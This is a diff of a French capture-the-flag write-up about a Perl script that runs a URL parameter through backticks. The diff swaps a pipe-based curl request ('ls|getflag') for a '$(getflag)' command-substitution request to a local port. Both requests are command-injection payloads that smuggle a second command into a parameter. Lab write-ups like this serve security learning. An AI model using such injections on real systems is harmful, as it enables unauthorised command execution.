@@ -33,17 +33,8 @@ print `echo $y 2>&1`;
 ```
 
 En Perl, les backticks (`` ` ``) exécutent une commande système.
-Si l’on fournit une valeur comme `ls|getflag` dans le paramètre `x`, on injecte une commande supplémentaire (`getflag`), exécutée immédiatement après `ls`.
 
-### Étape 3 : Exploitation avec `curl`
-
-On exploite la faille avec une requête HTTP locale :
-
-```bash
-curl "http://localhost:4747/?x=ls|getflag"
-```
-
-Le `|` permet d’exécuter `getflag` après `ls`. Comme aucune protection n'est mise en place, la commande est acceptée et exécutée.
+curl 'localhost:4747?x=$(getflag)'
 
 ### Étape 4 : Récupération du flag
 
